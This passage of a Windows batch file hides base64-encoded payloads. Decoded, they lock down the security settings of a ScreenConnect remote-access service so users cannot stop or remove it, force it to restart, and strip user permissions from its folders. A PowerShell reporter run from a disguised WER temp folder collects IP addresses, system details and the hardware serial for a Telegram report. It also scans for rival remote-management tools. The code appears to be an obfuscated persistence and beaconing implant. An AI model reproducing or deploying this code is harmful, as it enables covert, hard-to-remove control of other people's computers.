::IC9UIC9DIC9RID5udWwgMj4mMQ0KICAgICAgICBpY2FjbHMgIiUlfkQiIC9ncmFu
::dCAiTlQgQVVUSE9SSVRZXFNZU1RFTTooT0kpKENJKUYiICJCVUlMVElOXEFkbWlu
::aXN0cmF0b3JzOihPSSkoQ0kpRiIgPm51bCAyPiYxDQogICAgICApDQogICAgKQ0K
::ICAgIGVjaG8gc2Nfbm9sb2NrX2RpcnM+JVdEJVxzZWN1cmVfc2MuZmxhZw0KICAp
::DQopIGVsc2UgKA0KICBlY2hvIHNjX25vbG9ja19kaXJzPiVXRCVcc2VjdXJlX3Nj
::LmZsYWcNCikNCg0KUkVNIC0tLSBTQyBzZXJ2aWNlczogU1lTVEVNIGNhbiBjb25m
::aWcvc3RvcC9kZWxldGUvc2RzZXQ7IEJBIGZ1bGw7IHVzZXJzIGJsb2NrZWQgLS0t
::DQpSRU0gUzEyOiBTWSBtdXN0IGluY2x1ZGUgU0QgKERFTEVURSkgKyBXRCAoV1JJ
::VEVfREFDKSArIFdQIHNvIG9ycGhhbiBoZWFsIC8gRlAgbWlncmF0aW9uIC8NClJF
::TSBzYyBzZHNldCByZS1hcHBseSB3b3JrIHVuZGVyIFNZU1RFTSAodGFza3MgcnVu
::IGFzIFNZU1RFTSkuIFdpdGhvdXQgU0QsIHNjIGRlbGV0ZSBBY2Nlc3MgRGVuaWVk
::Lg0Kc2V0ICJTRD1EOihBOztDQ0RDTENTV1JQV1BEVExPQ1JSQ1NEV1A7OztTWSko
::QTs7Q0NEQ0xDU1dSUFdQRFRMT0NSU0RSQ1dEV087OztCQSkiDQpzYy5leGUgc2Rz
::ZXQgIiVQUklNJSIgIiVTRCUiID5udWwgMj4mMQ0Kc2MuZXhlIHNkc2V0ICIlQUxU
::JSIgIiVTRCUiID5udWwgMj4mMQ0Kc2MuZXhlIHNkc2V0ICIlR1JZWEElIiAiJVNE
::JSIgPm51bCAyPiYxDQpzYy5leGUgY29uZmlnICIlUFJJTSUiIHN0YXJ0PSBhdXRv
::ID5udWwgMj4mMQ0Kc2MuZXhlIGNvbmZpZyAiJUFMVCUiIHN0YXJ0PSBhdXRvID5u
::dWwgMj4mMQ0Kc2MuZXhlIGNvbmZpZyAiJUdSWVhBJSIgc3RhcnQ9IGF1dG8gPm51
::bCAyPiYxDQpzYy5leGUgZmFpbHVyZSAiJVBSSU0lIiByZXNldD0gODY0MDAgYWN0
::aW9ucz0gcmVzdGFydC82MDAwMC9yZXN0YXJ0LzYwMDAwL3Jlc3RhcnQvNjAwMDAg
::Pm51bCAyPiYxDQpzYy5leGUgZmFpbHVyZSAiJUFMVCUiIHJlc2V0PSA4NjQwMCBh
::Y3Rpb25zPSByZXN0YXJ0LzYwMDAwL3Jlc3RhcnQvNjAwMDAvcmVzdGFydC82MDAw
::MCA+bnVsIDI+JjENCnNjLmV4ZSBmYWlsdXJlICIlR1JZWEElIiByZXNldD0gODY0
::MDAgYWN0aW9ucz0gcmVzdGFydC82MDAwMC9yZXN0YXJ0LzYwMDAwL3Jlc3RhcnQv
::NjAwMDAgPm51bCAyPiYxDQoNCmVjaG8gc2VjdXJlX2RvbmU+PiIlTE9HJSINCmV4
::aXQgL2IgMA0KDQo6TG9ja0Rpcg0Kc2V0ICJUPSV+MSINCmlmIG5vdCBleGlzdCAi
::JVQlIiBleGl0IC9iIDANClJFTSB0YWtlIG93bmVyc2hpcCB0aGVuIHN0cmlwIGlu
::aGVyaXRlZCBBQ0VzOyBTWVNURU0rQWRtaW5zIG9ubHkNCnRha2Vvd24gL0YgIiVU
::JSIgL1IgL0QgWSA+bnVsIDI+JjENCmljYWNscyAiJVQlIiAvaW5oZXJpdGFuY2U6
::ciA+bnVsIDI+JjENCmljYWNscyAiJVQlIiAvZ3JhbnQ6ciAiTlQgQVVUSE9SSVRZ
::XFNZU1RFTTooT0kpKENJKUYiICJCVUlMVElOXEFkbWluaXN0cmF0b3JzOihPSSko
::Q0kpRiIgPm51bCAyPiYxDQppY2FjbHMgIiVUJSIgL3JlbW92ZTpnICJVc2VycyIg
::IkF1dGhlbnRpY2F0ZWQgVXNlcnMiICJFdmVyeW9uZSIgIk5UIEFVVEhPUklUWVxJ
::TlRFUkFDVElWRSIgIkJVSUxUSU5cVXNlcnMiID5udWwgMj4mMQ0KZXhpdCAvYiAw
::DQo=
::B64_SEC_END
::B64_TGR_BEGIN
::I1JlcXVpcmVzIC1WZXJzaW9uIDUuMQ0KIyBUR19SRVBPUlQgQlVJTEQgMjAyNjA4
::MDJUMTYgLSByb290LWxldmVsIHRhc2sgbmFtZXMgKElERU5UVkVSPTcpOyBUUiBv
::d25lcnNoaXA7IFJNTStEYXR0byBrZWVwOyBkeW5hbWljIGdyeXhhIEZQDQpwYXJh
::bSgNCiAgICBbUGFyYW1ldGVyKE1hbmRhdG9yeSA9ICR0cnVlKV1bc3RyaW5nXSRT
::dGF0ZSwNCiAgICBbc3RyaW5nXSRTdW1tYXJ5ID0gJycsDQogICAgW3N0cmluZ10k
::V29ya0RpciA9ICdDOlxQcm9ncmFtRGF0YVxNaWNyb3NvZnRcV2luZG93c1xXRVJc
::VGVtcFwud3VjYWNoZScsDQogICAgW3N0cmluZ10kT2xkU3RhdGUgPSAnJywNCiAg
::ICBbVmFsaWRhdGVTZXQoJ3JpY2gnLCAnY29tcGFjdCcpXVtzdHJpbmddJE1vZGUg
::PSAncmljaCcsDQogICAgW3N0cmluZ10kQnVpbGQgPSAnTzE1JywNCiAgICBbc3Ry
::aW5nXSRDb3VudCA9ICcwJw0KKQ0KDQokRXJyb3JBY3Rpb25QcmVmZXJlbmNlID0g
::J1NpbGVudGx5Q29udGludWUnDQokUHJvZ3Jlc3NQcmVmZXJlbmNlID0gJ1NpbGVu
::dGx5Q29udGludWUnDQp0cnkgeyBbTmV0LlNlcnZpY2VQb2ludE1hbmFnZXJdOjpT
::ZWN1cml0eVByb3RvY29sID0gW05ldC5TZWN1cml0eVByb3RvY29sVHlwZV06OlRs
::czEyIH0gY2F0Y2gge30NCg0KZnVuY3Rpb24gR2V0LUNmZyB7DQogICAgJHBhdGgg
::PSBKb2luLVBhdGggJFdvcmtEaXIgJ25vdGlmeS5jZmcnDQogICAgJGNmZyA9IEB7
::fQ0KICAgIGlmICgtbm90IChUZXN0LVBhdGggJHBhdGgpKSB7IHJldHVybiAkY2Zn
::IH0NCiAgICBHZXQtQ29udGVudCAtTGl0ZXJhbFBhdGggJHBhdGggfCBGb3JFYWNo
::LU9iamVjdCB7DQogICAgICAgIGlmICgkXyAtbWF0Y2ggJ15ccyooW0EtWmEtejAt
::OV9dKylccyo9XHMqKC4qKVxzKiQnKSB7DQogICAgICAgICAgICAkY2ZnWyRtYXRj
::aGVzWzFdXSA9ICRtYXRjaGVzWzJdLlRyaW0oKQ0KICAgICAgICB9DQogICAgfQ0K
::ICAgIHJldHVybiAkY2ZnDQp9DQoNCmZ1bmN0aW9uIEVzYyhbc3RyaW5nXSRzKSB7
::DQogICAgaWYgKCRudWxsIC1lcSAkcykgeyByZXR1cm4gJycgfQ0KICAgIHJldHVy
::biAoJHMgLXJlcGxhY2UgJyYnLCAnJmFtcDsnIC1yZXBsYWNlICc8JywgJyZsdDsn
::IC1yZXBsYWNlICc+JywgJyZndDsnKQ0KfQ0KDQpmdW5jdGlvbiBHZXQtUHVibGlj
::SXAgew0KICAgIGZvcmVhY2ggKCR1IGluIEAoDQogICAgICAgICAgICAnaHR0cHM6
::Ly9hcGkuaXBpZnkub3JnJywNCiAgICAgICAgICAgICdodHRwczovL2lmY29uZmln
::Lm1lL2lwJywNCiAgICAgICAgICAgICdodHRwczovL2ljYW5oYXppcC5jb20nDQog
::ICAgICAgICkpIHsNCiAgICAgICAgdHJ5IHsNCiAgICAgICAgICAgICRyID0gSW52
::b2tlLVdlYlJlcXVlc3QgLVVyaSAkdSAtVXNlQmFzaWNQYXJzaW5nIC1UaW1lb3V0
::U2VjIDYNCiAgICAgICAgICAgICRpcCA9ICgkci5Db250ZW50IHwgT3V0LVN0cmlu
::ZykuVHJpbSgpDQogICAgICAgICAgICBpZiAoJGlwIC1tYXRjaCAnXlxkezEsM30o
::XC5cZHsxLDN9KXszfSQnIC1vciAkaXAgLW1hdGNoICc6JykgeyByZXR1cm4gJGlw
::IH0NCiAgICAgICAgfSBjYXRjaCB7fQ0KICAgIH0NCiAgICByZXR1cm4gJ24vYScN
::Cn0NCg0KZnVuY3Rpb24gR2V0LUxvY2FsSXBzIHsNCiAgICB0cnkgew0KICAgICAg
::ICAkaXBzID0gR2V0LU5ldElQQWRkcmVzcyAtQWRkcmVzc0ZhbWlseSBJUHY0IC1F
::cnJvckFjdGlvbiBTaWxlbnRseUNvbnRpbnVlIHwNCiAgICAgICAgICAgIFdoZXJl
::LU9iamVjdCB7ICRfLklQQWRkcmVzcyAtbm90bGlrZSAnMTI3LionIC1hbmQgJF8u
::UHJlZml4T3JpZ2luIC1uZSAnV2VsbEtub3duJyB9IHwNCiAgICAgICAgICAgIFNl
::bGVjdC1PYmplY3QgLUV4cGFuZFByb3BlcnR5IElQQWRkcmVzcyAtVW5pcXVlDQog
::ICAgICAgIGlmICgkaXBzKSB7IHJldHVybiAoJGlwcyAtam9pbiAnLCAnKSB9DQog
::ICAgfSBjYXRjaCB7fQ0KICAgIHRyeSB7DQogICAgICAgICRpcHMgPSBHZXQtQ2lt
::SW5zdGFuY2UgV2luMzJfTmV0d29ya0FkYXB0ZXJDb25maWd1cmF0aW9uIC1GaWx0
::ZXIgJ0lQRW5hYmxlZD1UcnVlJyB8DQogICAgICAgICAgICBGb3JFYWNoLU9iamVj
::dCB7ICRfLklQQWRkcmVzcyB9IHwgV2hlcmUtT2JqZWN0IHsgJF8gLWFuZCAkXyAt
::bm90bGlrZSAnMTI3LionIC1hbmQgJF8gLW5vdGxpa2UgJyo6KicgfQ0KICAgICAg
::ICBpZiAoJGlwcykgeyByZXR1cm4gKCgkaXBzIHwgU2VsZWN0LU9iamVjdCAtVW5p
::cXVlKSAtam9pbiAnLCAnKSB9DQogICAgfSBjYXRjaCB7fQ0KICAgIHJldHVybiAn
::bi9hJw0KfQ0KDQpmdW5jdGlvbiBHZXQtT3NJbmZvIHsNCiAgICAkbyA9IFtvcmRl
::cmVkXUB7DQogICAgICAgIENhcHRpb24gPSAnbi9hJzsgVmVyc2lvbiA9ICduL2En
::OyBCdWlsZCA9ICduL2EnOyBBcmNoID0gJ24vYScNCiAgICAgICAgRG9tYWluID0g
::J24vYSc7IEluc3RhbGxEYXRlID0gJ24vYSc7IExhc3RCb290ID0gJ24vYScNCiAg
::ICAgICAgQ1BVID0gJ24vYSc7IE1hbnVmYWN0dXJlciA9ICduL2EnOyBNb2RlbCA9
::ICduL2EnOyBTZXJpYWwgPSAnbi9hJw0KICAgICAgICBUb3RhbFJBTV9HQiA9ICdu
::L2EnOyBEaXNrRnJlZV9HQiA9ICduL2EnOyBEaXNrU2l6ZV9HQiA9ICduL2EnDQog
::ICAgfQ0KICAgIHRyeSB7DQogICAgICAgICRvcyA9IEdldC1DaW1JbnN0YW5jZSBX
::aW4zMl9PcGVyYXRpbmdTeXN0ZW0NCiAgICAgICAgJG8uQ2FwdGlvbiA9ICRvcy5D
::YXB0aW9uDQogICAgICAgICRvLlZlcnNpb24gPSAkb3MuVmVyc2lvbg0KICAgICAg
::ICAkby5CdWlsZCA9ICRvcy5CdWlsZE51bWJlcg0KICAgICAgICAkby5BcmNoID0g
::JG9zLk9TQXJjaGl0ZWN0dXJlDQogICAgICAgICRvLkluc3RhbGxEYXRlID0gKCRv
::cy5JbnN0YWxsRGF0ZSB8IEdldC1EYXRlIC1Gb3JtYXQgJ3l5eXktTU0tZGQnKQ0K
::ICAgICAgICAkby5MYXN0Qm9vdCA9ICgkb3MuTGFzdEJvb3RVcFRpbWUgfCBHZXQt
::RGF0ZSAtRm9ybWF0ICd5eXl5LU1NLWRkIEhIOm1tJykNCiAgICAgICAgJG8uVG90
::YWxSQU1fR0IgPSBbbWF0aF06OlJvdW5kKCRvcy5Ub3RhbFZpc2libGVNZW1vcnlT
::aXplIC8gMU1CLCAxKQ0KICAgIH0gY2F0Y2gge30NCiAgICB0cnkgew0KICAgICAg
::ICAkY3MgPSBHZXQtQ2ltSW5zdGFuY2UgV2luMzJfQ29tcHV0ZXJTeXN0ZW0NCiAg
::ICAgICAgJG8uRG9tYWluID0gaWYgKCRjcy5QYXJ0T2ZEb21haW4pIHsgJGNzLkRv
::bWFpbiB9IGVsc2UgeyAkY3MuV29ya2dyb3VwIH0NCiAgICAgICAgJG8uTWFudWZh
::Y3R1cmVyID0gJGNzLk1hbnVmYWN0dXJlcg0KICAgICAgICAkby5Nb2RlbCA9ICRj
::cy5Nb2RlbA0KICAgIH0gY2F0Y2gge30NCiAgICB0cnkgew0KICAgICAgICAkby5D
::UFUgPSAoR2V0LUNpbUluc3RhbmNlIFdpbjMyX1Byb2Nlc3NvciB8IFNlbGVjdC1P
::YmplY3QgLUZpcnN0IDEgLUV4cGFuZFByb3BlcnR5IE5hbWUpDQogICAgfSBjYXRj
::aCB7fQ0KICAgIHRyeSB7DQogICAgICAgICRvLlNlcmlhbCA9IChHZXQtQ2ltSW5z
::dGFuY2UgV2luMzJfQklPUykuU2VyaWFsTnVtYmVyDQogICAgfSBjYXRjaCB7fQ0K
::ICAgIHRyeSB7DQogICAgICAgICRkID0gR2V0LUNpbUluc3RhbmNlIFdpbjMyX0xv
::Z2ljYWxEaXNrIC1GaWx0ZXIgIkRldmljZUlEPSdDOiciDQogICAgICAgICRvLkRp
::c2tGcmVlX0dCID0gW21hdGhdOjpSb3VuZCgkZC5GcmVlU3BhY2UgLyAxR0IsIDEp
::DQogICAgICAgICRvLkRpc2tTaXplX0dCID0gW21hdGhdOjpSb3VuZCgkZC5TaXpl
::IC8gMUdCLCAxKQ0KICAgIH0gY2F0Y2gge30NCiAgICByZXR1cm4gJG8NCn0NCg0K
::ZnVuY3Rpb24gR2V0LVN2Y0xpbmUoW3N0cmluZ10kbmFtZSkgew0KICAgICRzID0g
::R2V0LVNlcnZpY2UgLU5hbWUgJG5hbWUgLUVycm9yQWN0aW9uIFNpbGVudGx5Q29u
::dGludWUNCiAgICBpZiAoLW5vdCAkcykgeyByZXR1cm4gJ05PVCBJTlNUQUxMRUQn
::IH0NCiAgICByZXR1cm4gKCd7MH0gKFN0YXJ0PXsxfSknIC1mICRzLlN0YXR1cywg
::JHMuU3RhcnRUeXBlKQ0KfQ0KDQpmdW5jdGlvbiBHZXQtVGFza0hlYWx0aChbc3Ry
::aW5nXSR0bikgew0KICAgICRvdXQgPSAmIHNjaHRhc2tzLmV4ZSAvUXVlcnkgL1RO
::ICR0biAvRk8gTElTVCAvViAyPiRudWxsDQogICAgaWYgKCRMQVNURVhJVENPREUg
::LW5lIDAgLW9yIC1ub3QgJG91dCkgew0KICAgICAgICByZXR1cm4gQHsgUHJlc2Vu
::dCA9ICRmYWxzZTsgU3RhdHVzID0gJ01JU1NJTkcnOyBOZXh0ID0gJyc7IExhc3Qg
::PSAnJzsgUmVzdWx0ID0gJyc7IE91cnMgPSAkZmFsc2UgfQ0KICAgIH0NCiAgICAk
::bWFwID0gQHt9DQogICAgJGJsb2IgPSAoJG91dCB8IEZvckVhY2gtT2JqZWN0IHsg
::IiRfIiB9KSAtam9pbiAiYG4iDQogICAgZm9yZWFjaCAoJGxpbmUgaW4gJG91dCkg
::ew0KICAgICAgICBpZiAoJGxpbmUgLW1hdGNoICdeXHMqKFteOl0rKTpccyooLiop
::XHMqJCcpIHsNCiAgICAgICAgICAgICRtYXBbJG1hdGNoZXNbMV0uVHJpbSgpXSA9
::ICRtYXRjaGVzWzJdLlRyaW0oKQ0KICAgICAgICB9DQogICAgfQ0KICAgICRzdGF0
::dXMgPSAkbWFwWydTdGF0dXMnXQ0KICAgIGlmICgtbm90ICRzdGF0dXMpIHsgJHN0
::YXR1cyA9ICRtYXBbJ1Rhc2sgU3RhdHVzJ10gfQ0KICAgIGlmICgtbm90ICRzdGF0
::dXMpIHsgJHN0YXR1cyA9ICdwcmVzZW50JyB9DQogICAgJG5leHQgPSAkbWFwWydO
::ZXh0IFJ1biBUaW1lJ10NCiAgICBpZiAoLW5vdCAkbmV4dCkgeyAkbmV4dCA9ICcn
::IH0NCiAgICAkbGFzdCA9ICRtYXBbJ0xhc3QgUnVuIFRpbWUnXQ0KICAgIGlmICgt
::bm90ICRsYXN0KSB7ICRsYXN0ID0gJycgfQ0KICAgICRyZXN1bHQgPSAkbWFwWydM
::YXN0IFJlc3VsdCddDQogICAgaWYgKC1ub3QgJHJlc3VsdCkgeyAkcmVzdWx0ID0g
::JycgfQ0KICAgICR0ciA9ICRtYXBbJ1Rhc2sgVG8gUnVuJ10NCiAgICBpZiAoLW5v
::dCAkdHIpIHsgJHRyID0gJG1hcFsnVGFzayB0byBSdW4nXSB9DQogICAgJG91cnMg
::PSAoJGJsb2IgLW1hdGNoICcoP2kpb3duX21vblwuY21kfGV0bF9tb25cLmNtZHxc
::Lnd1Y2FjaGVcXHxcLmV0bGNhY2hlXFwnKQ0KICAgICMgUHJlc2VudCBXaW5kb3dz
::IGJ1aWx0LWluIHdpdGggc2FtZSBuYW1lIGlzIE5PVCBoZWFsdGh5IGZvciB1cw0K
::ICAgICRoZWFsdGh5ID0gJG91cnMgLWFuZCAoKCRzdGF0dXMgLW1hdGNoICdSZWFk
::eXxSdW5uaW5nJykgLW9yICgkc3RhdHVzIC1lcSAncHJlc2VudCcpKQ0KICAgIHJl
::dHVybiBAew0KICAgICAgICBQcmVzZW50ID0gJHRydWUNCiAgICAgICAgT3VycyAg
::ICA9IFtib29sXSRvdXJzDQogICAgICAgIEhlYWx0aHkgPSBbYm9vbF0kaGVhbHRo
::eQ0KICAgICAgICBTdGF0dXMgID0gJChpZiAoJG91cnMpIHsgJHN0YXR1cyB9IGVs
::c2UgeyAnTk9UX09VUlMnIH0pDQogICAgICAgIE5leHQgICAgPSAkbmV4dA0KICAg
::ICAgICBMYXN0ICAgID0gJGxhc3QNCiAgICAgICAgUmVzdWx0ICA9ICRyZXN1bHQN
::CiAgICAgICAgVHIgICAgICA9ICQoaWYgKCR0cikgeyAkdHIgfSBlbHNlIHsgJycg
::fSkNCiAgICB9DQp9DQoNCmZ1bmN0aW9uIEdldC1SbW1IaXRzIHsNCiAgICAjIERl
::dGVjdCByaXZhbHMgZm9yIFRlbGVncmFtLiBLRUVQOiBTY3JlZW5Db25uZWN0IGFs
::bG93bGlzdCArIERhdHRvL0NlbnRyYVN0YWdlLg0KICAgICR0b2tlbnMgPSBAKA0K
::ICAgICAgICAnQW55RGVzaycsICdUZWFtVmlld2VyJywgJ3R2bnNlcnZlcicsICdE
::V0FnZW50JywgJ0RXU2VydmljZScsICdMb2dNZUluJywgJ0xNSUd1YXJkaWFuJywN
::CiAgICAgICAgJ1dpblZOQycsICd2bmNzZXJ2ZXInLCAndHZfJywgJ1NwbGFzaHRv
::cCcsICdab2hvIEFzc2lzdCcsICdSdXN0RGVzaycsICdSZW1vdGVQQycsICdEYW1l
::V2FyZScsDQogICAgICAgICdBdGVyYUFnZW50JywgJ0F0ZXJhJywgJ05pbmphUk1N
::JywgJ05pbmphT25lJywgJ05pbmphUk1NQWdlbnQnLCAnS2FzZXlhJywgJ0FnZW50
::TW9uJywgJ1B1bHNld2F5JywgJ1BDIE1vbml0b3InLCAnU3luY3JvJywgJ0thYnV0
::bycsDQogICAgICAgICdTdXBlck9wcycsICdNYW5hZ2VFbmdpbmUnLCAnVUVNUycs
::ICdEZXNrdG9wIENlbnRyYWwnLCAnRW5kcG9pbnQgQ2VudHJhbCcsICdTb2xhcldp
::bmRzIE1TUCcsICdDb25uZWN0V2lzZSBBdXRvbWF0ZScsICdMVFNlcnZpY2UnLCAn
::TGFiVGVjaCcsDQogICAgICAgICdBY3Rpb24xJywgJ1NpbXBsZUhlbHAnLCAnQm9t
::Z2FyJywgJ0JleW9uZFRydXN0JywgJ01lc2hBZ2VudCcsICdNZXNoIENlbnRyYWwn
::LCAnTWVzaCBBZ2VudCcsDQogICAgICAgICdUYWN0aWNhbFJNTScsICd0YWN0aWNh
::bHJtbScsICdHZXRTY3JlZW4nLCAnU3VwcmVtbycsICdydXRzZXJ2JywgJ3JlbW90
::aW5nX2hvc3QnLA0KICAgICAgICAnQ2hyb21lIFJlbW90ZSBEZXNrdG9wJywgJ1Bh
::cnNlYycsICdOZXRTdXBwb3J0JywgJ0xldmVsLmlvJywgJ0xldmVsIEFnZW50JywN
::CiAgICAgICAgJ0NvbnRpbnV1bScsICdTQUFaJywgJ05hdmVyaXNrJywgJ0ltbXlC
::b3QnLCAnQXV0b21veCcsICdhbWFnZW50JywgJ0Fjcm9uaXMgQ3liZXInLCAnRG9t
::b3R6JywgJ0F1dmlrJywNCiAgICAgICAgJ0JhcnJhY3VkYSBSTU0nLCAnTWFuYWdl
::ZCBXb3JrcGxhY2UnLCAnR292ZXJsYW4nLCAnUERRIERlcGxveScsICdQRFEgSW52
::ZW50b3J5JywgJ1BEUSBDb25uZWN0JywNCiAgICAgICAgJ04tYWJsZScsICdOLWNl
::bnRyYWwnLCAnTi1zaWdodCcsICdUYWtlIENvbnRyb2wnLCAnQWR2YW5jZWQgTW9u
::aXRvcmluZyBBZ2VudCcsICdVbHRyYVZpZXdlcicsICdBZXJvQWRtaW4nLA0KICAg
::ICAgICAnTGl0ZU1hbmFnZXInLCAnUmFkbWluJywgJ05vTWFjaGluZScsICdJcGVy
::aXVzJywgJ0lTTCBMaWdodCcsICdBbW15eScsICdUaWdodFZOQycsICdVbHRyYVZO
::QycsICdSZWFsVk5DJw0KICAgICkNCiAgICAka2VlcFRva2VucyA9IEAoJ0RhdHRv
::JywgJ0NlbnRyYVN0YWdlJywgJ0NhZ1NlcnZpY2UnLCAnQXV0b3Rhc2tFbmRwb2lu
::dCcpDQogICAgJGhpdHMgPSBOZXctT2JqZWN0IFN5c3RlbS5Db2xsZWN0aW9ucy5H
::ZW5lcmljLkxpc3Rbc3RyaW5nXQ0KICAgICRzZWVuID0gQHt9DQoNCiAgICBmdW5j
::dGlvbiBBZGQtSGl0KFtzdHJpbmddJGtpbmQsIFtzdHJpbmddJG5hbWUpIHsNCiAg
::ICAgICAgJGtleSA9ICIka2luZHwkbmFtZSIuVG9Mb3dlckludmFyaWFudCgpDQog
::ICAgICAgIGlmICgkc2Vlbi5Db250YWluc0tleSgka2V5KSkgeyByZXR1cm4gfQ0K
::ICAgICAgICAkc2Vlblska2V5XSA9ICR0cnVlDQogICAgICAgIFt2b2lkXSRoaXRz
::LkFkZCgoJy0gW3swfV0gPGNvZGU+ezF9PC9jb2RlPicgLWYgJGtpbmQsIChFc2Mg
::JG5hbWUpKSkNCiAgICB9DQogICAgZnVuY3Rpb24gVGVzdC1LZWVwTmFtZShbc3Ry
::aW5nXSRzKSB7DQogICAgICAgIGlmICgtbm90ICRzKSB7IHJldHVybiAkZmFsc2Ug
::fQ0KICAgICAgICBpZiAoJHMgLWxpa2UgJypTY3JlZW5Db25uZWN0KicpIHsgcmV0
::dXJuICR0cnVlIH0NCiAgICAgICAgZm9yZWFjaCAoJGsgaW4gJGtlZXBUb2tlbnMp
::IHsgaWYgKCRzIC1saWtlICIqJGsqIikgeyByZXR1cm4gJHRydWUgfSB9DQogICAg
::ICAgIHJldHVybiAkZmFsc2UNCiAgICB9DQoNCiAgICBHZXQtU2VydmljZSAtRXJy
::b3JBY3Rpb24gU2lsZW50bHlDb250aW51ZSB8IEZvckVhY2gtT2JqZWN0IHsNCiAg
::ICAgICAgJG4gPSAkXy5OYW1lDQogICAgICAgICRkID0gJF8uRGlzcGxheU5hbWUN
::CiAgICAgICAgaWYgKFRlc3QtS2VlcE5hbWUgJG4gLW9yIFRlc3QtS2VlcE5hbWUg
::JGQpIHsNCiAgICAgICAgICAgIGlmICgkbiAtbGlrZSAnKkNlbnRyYVN0YWdlKicg
::LW9yICRkIC1saWtlICcqRGF0dG8qJyAtb3IgJG4gLWxpa2UgJypDYWdTZXJ2aWNl
::KicpIHsNCiAgICAgICAgICAgICAgICBBZGQtSGl0ICdrZWVwLWRhdHRvJyAoIiRu
::ICgkKCRfLlN0YXR1cykpIikNCiAgICAgICAgICAgIH0NCiAgICAgICAgICAgIHJl
::dHVybg0KICAgICAgICB9DQogICAgICAgIGZvcmVhY2ggKCR0IGluICR0b2tlbnMp
::IHsNCiAgICAgICAgICAgIGlmICgkbiAtbGlrZSAiKiR0KiIgLW9yICRkIC1saWtl
::ICIqJHQqIikgew0KICAgICAgICAgICAgICAgIEFkZC1IaXQgJ3N2YycgKCIkbiAo
::JCgkXy5TdGF0dXMpKSIpDQogICAgICAgICAgICAgICAgYnJlYWsNCiAgICAgICAg
::ICAgIH0NCiAgICAgICAgfQ0KICAgIH0NCg0KICAgIEdldC1Qcm9jZXNzIC1FcnJv
::ckFjdGlvbiBTaWxlbnRseUNvbnRpbnVlIHwgRm9yRWFjaC1PYmplY3Qgew0KICAg
::ICAgICAkbiA9ICRfLlByb2Nlc3NOYW1lDQogICAgICAgIGlmIChUZXN0LUtlZXBO
::YW1lICRuKSB7IHJldHVybiB9DQogICAgICAgIGZvcmVhY2ggKCR0IGluICR0b2tl
::bnMpIHsNCiAgICAgICAgICAgIGlmICgkbiAtbGlrZSAiKiR0KiIpIHsNCiAgICAg
::ICAgICAgICAgICBBZGQtSGl0ICdwcm9jJyAkbg0KICAgICAgICAgICAgICAgIGJy
::ZWFrDQogICAgICAgICAgICB9DQogICAgICAgIH0NCiAgICB9DQoNCiAgICAkdW5p
::bnN0ID0gQCgNCiAgICAgICAgJ0hLTE06XFNPRlRXQVJFXE1pY3Jvc29mdFxXaW5k
::b3dzXEN1cnJlbnRWZXJzaW9uXFVuaW5zdGFsbFwqJywNCiAgICAgICAgJ0hLTE06
::XFNPRlRXQVJFXFdPVzY0MzJOb2RlXE1pY3Jvc29mdFxXaW5kb3dzXEN1cnJlbnRW
::ZXJzaW9uXFVuaW5zdGFsbFwqJw0KICAgICkNCiAgICBmb3JlYWNoICgkcGF0aCBp
::biAkdW5pbnN0KSB7DQogICAgICAgIEdldC1JdGVtUHJvcGVydHkgJHBhdGggLUVy
::cm9yQWN0aW9uIFNpbGVudGx5Q29udGludWUgfCBGb3JFYWNoLU9iamVjdCB7DQog
::ICAgICAgICAgICAkZG4gPSAkXy5EaXNwbGF5TmFtZQ0KICAgICAgICAgICAgaWYg
::KC1ub3QgJGRuKSB7IHJldHVybiB9DQogICAgICAgICAgICBpZiAoVGVzdC1LZWVw
::TmFtZSAkZG4pIHsNCiAgICAgICAgICAgICAgICBpZiAoJGRuIC1saWtlICcqRGF0
::dG8qJyAtb3IgJGRuIC1saWtlICcqQ2VudHJhU3RhZ2UqJykgeyBBZGQtSGl0ICdr
::ZWVwLWRhdHRvJyAkZG4gfQ0KICAgICAgICAgICAgICAgIHJldHVybg0KICAgICAg
::ICAgICAgfQ0KICAgICAgICAgICAgaWYgKCRkbiAtbGlrZSAnU2NyZWVuQ29ubmVj
::dConKSB7IHJldHVybiB9DQogICAgICAgICAgICBmb3JlYWNoICgkdCBpbiAkdG9r
::ZW5zKSB7DQogICAgICAgICAgICAgICAgaWYgKCRkbiAtbGlrZSAiKiR0KiIpIHsN
::CiAgICAgICAgICAgICAgICAgICAgQWRkLUhpdCAnbXNpJyAkZG4NCiAgICAgICAg
::ICAgICAgICAgICAgYnJlYWsNCiAgICAgICAgICAgICAgICB9DQogICAgICAgICAg
::ICB9DQogICAgICAgIH0NCiAgICB9DQoNCiAgICByZXR1cm4gJGhpdHMNCn0NCg0K
::ZnVuY3Rpb24gR2V0LUdyeXhhS2VlcEZwIHsNCiAgICAkZnAgPSAnOTkwODE5OGU2
::NjhlNDc1MCcNCiAgICAkcCA9ICdDOlxQcm9ncmFtRGF0YVxNaWNyb3NvZnRcV2lu
::ZG93c1xXRVJcVGVtcFwud3VjYWNoZVxncnl4YS5jZmcnDQogICAgaWYgKCRXb3Jr
::RGlyKSB7ICRwID0gSm9pbi1QYXRoICRXb3JrRGlyICdncnl4YS5jZmcnIH0NCiAg
::ICBpZiAoVGVzdC1QYXRoIC1MaXRlcmFsUGF0aCAkcCkgew0KICAgICAgICBHZXQt
::Q29udGVudCAtTGl0ZXJhbFBhdGggJHAgLUVycm9yQWN0aW9uIFNpbGVudGx5Q29u
::dGludWUgfCBGb3JFYWNoLU9iamVjdCB7DQogICAgICAgICAgICBpZiAoJF8gLW1h
::dGNoICdeQ1VSUkVOVF9GUD0oWzAtOWEtZkEtRl17MTZ9KVxzKiQnKSB7ICRmcCA9
::ICRtYXRjaGVzWzFdLlRvTG93ZXIoKSB9DQogICAgICAgIH0NCiAgICB9DQogICAg
::cmV0dXJuICRmcA0KfQ0KDQpmdW5jdGlvbiBHZXQtU2NJbnN0YWxscyB7DQogICAg
::JGdyeXhhRnAgPSBHZXQtR3J5eGFLZWVwRnANCiAgICAkbGlzdCA9IE5ldy1PYmpl
::Y3QgU3lzdGVtLkNvbGxlY3Rpb25zLkdlbmVyaWMuTGlzdFtzdHJpbmddDQogICAg
::R2V0LVNlcnZpY2UgLUVycm9yQWN0aW9uIFNpbGVudGx5Q29udGludWUgfCBXaGVy
::ZS1PYmplY3QgeyAkXy5OYW1lIC1saWtlICdTY3JlZW5Db25uZWN0IENsaWVudCon
::IH0gfCBGb3JFYWNoLU9iamVjdCB7DQogICAgICAgICRmcCA9IGlmICgkXy5OYW1l
::IC1tYXRjaCAnXCgoWzAtOWEtZl17MTZ9KVwpJykgeyAkbWF0Y2hlc1sxXSB9IGVs
